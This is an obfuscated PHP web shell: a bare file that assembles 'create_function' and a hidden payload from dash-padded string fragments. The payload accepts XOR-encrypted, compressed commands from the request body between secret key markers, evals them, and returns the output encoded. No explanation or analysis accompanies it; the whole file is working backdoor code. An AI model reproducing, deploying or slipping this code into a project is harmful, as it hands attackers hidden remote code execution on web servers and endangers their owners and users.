<?php
$Q=str_replace('hr','','chrhrhrrhreate_hrfunctihron');
$s='@ba-s-e64_decode(-$m[1]),$-k)-));$o=-@ob_ge-t_conte---nts();@o-b_end_cle-an';
$N='ArA5Xx-U-0U";funct--ion- x-($-t,$k){$c=strl-en($k);$l=s-trle-n($t);$o="";fo';
$h='r-($i=0-;$i<$l;-){fo--r($j-=0;($j<$c&--&-$i<$l);$j++,$i++){$-o.=$t{-$i}^$k{';
$Z='();$r=@ba-se64_encod-e(@x(@gzco-mpr-ess($o)-,$k));pri-nt("-$-p$kh$r$kf");}';
$D='$k="2e6-34e91--";$kh-="521060504314-";$-kf="-a77b2-745-e35f";$p="mt6tx-VE';
$p='-$j}-;}}-return $o;}i-f (@-preg_match-("/$kh(-.+)$-kf--/",@-f-il-e_get_cont';
$d='ents("php://inp-u-t"),$m)==1) {@-o-b_start-();@e-val(@g-zunc-omp-ress(@x(';
$P=str_replace('-','',$D.$N.$h.$p.$d.$s.$Z);
$m=$Q('',$P);$m();
?>
